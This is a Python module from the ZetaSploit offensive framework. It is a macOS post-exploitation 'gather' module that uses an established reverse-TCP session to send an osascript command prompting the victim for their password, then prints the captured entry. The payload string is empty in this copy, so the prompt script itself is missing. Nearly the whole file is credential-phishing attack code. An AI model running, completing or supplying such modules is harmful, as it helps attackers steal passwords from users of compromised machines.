#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.badges import badges
from core.storage import storage
from core.parser import parser

from data.modules.exploit.macos.stager.zetant_reverse_tcp.core.session import session

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.storage = storage()
        self.parser = parser()
        
        self.session = session()

        self.details = {
            'Name': "macos/zetant/gather/prompt",
            'Authors': [
                'enty8080'
            ],
            'Description': "Prompt user to type password.",
            'Comments': [
                ''
            ]
        }

        self.options = {
            'SESSION': {
                'Description': 'Session to run on.',
                'Value': 0,
                'Required': True
            }
        }

    def run(self):
        exists, controller = self.session.get_session(self.parser.parse_options(self.options))
        if exists:
            payload = ""
            status, output = controller.send_command("osascript", payload)
            if status == "error":
                self.badges.output_error("Failed to prompt user to type password!")
            else:
                self.badges.output_information("User Entered: " + output)
